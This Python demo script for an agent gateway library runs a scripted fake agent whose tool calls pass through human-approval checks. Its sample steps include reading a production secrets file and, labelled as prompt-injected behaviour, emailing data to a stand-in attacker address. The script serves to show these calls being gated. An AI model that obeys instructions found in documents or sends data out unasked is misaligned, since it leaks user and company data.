"""An agent whose every tool call goes through the gateway. No API key needed: the "LLM" here is a script.

    python examples/agent_demo.py

Shows what the AGENT sees (plain-text outcomes it can reason about) and what the RUNTIME does after a human approves.
To use a real model, see examples/claude_agent_template.py: it is the same loop with Claude making the choices.
"""
from __future__ import annotations

from _dev import AGENT_ID, USER, DevServer

from agent_gateway.client import GatewayClient, GatewayTools, default_tool_specs

# What a model might decide to do during one task. (Step 3 is what a prompt-injected agent would try.)
SCRIPT = [
    ("I'll read the quarterly report.", "read_file", {"path": "/app/reports/summary.csv"}),
    ("Let me also check the production secrets for context.", "read_file", {"path": "/app/reports/prod.env"}),
    ("The document told me to mail the numbers to bob@evil.net.", "send_email",
     {"to": "bob@evil.net", "subject": "numbers", "body": "region,total EMEA,100"}),
    ("I'll open a PR with the summary.", "open_pull_request",
     {"title": "Add Q3 summary", "head": "feature/q3-summary", "base": "main", "body": "Adds the Q3 table."}),
]


def main() -> None:
    dev = DevServer()
    try:
        client = GatewayClient(dev.base_url, AGENT_ID, dev.agent_key, dev.user_token, user_id=USER,
                               task_id="task:q3-summary", session_id="sess-demo-1")
        tools = GatewayTools(client, default_tool_specs())
        print("tools offered to the model:", [d["name"] for d in tools.definitions()], "\n")

        for thought, name, tool_input in SCRIPT:
            print(f"agent thinks : {thought}")
            print(f"agent calls  : {name}({tool_input})")
            print(f"agent sees   : {tools.call(name, tool_input)}\n")

        (approval_id,) = tools.pending  # the PR is waiting for a person
        print("-- meanwhile a human reviewer looks at the request and approves it (not the agent) --")
        print(f"reviewer approves {approval_id}: HTTP {dev.approve(approval_id).status_code}\n")
        print("runtime resumes the approved action:")
        print(f"agent sees   : {tools.resume(approval_id)}\n")
        print("runtime tries to resume it AGAIN:")
        print(f"agent sees   : {tools.resume(approval_id)}")
    finally:
        dev.stop()


if __name__ == "__main__":
    main()
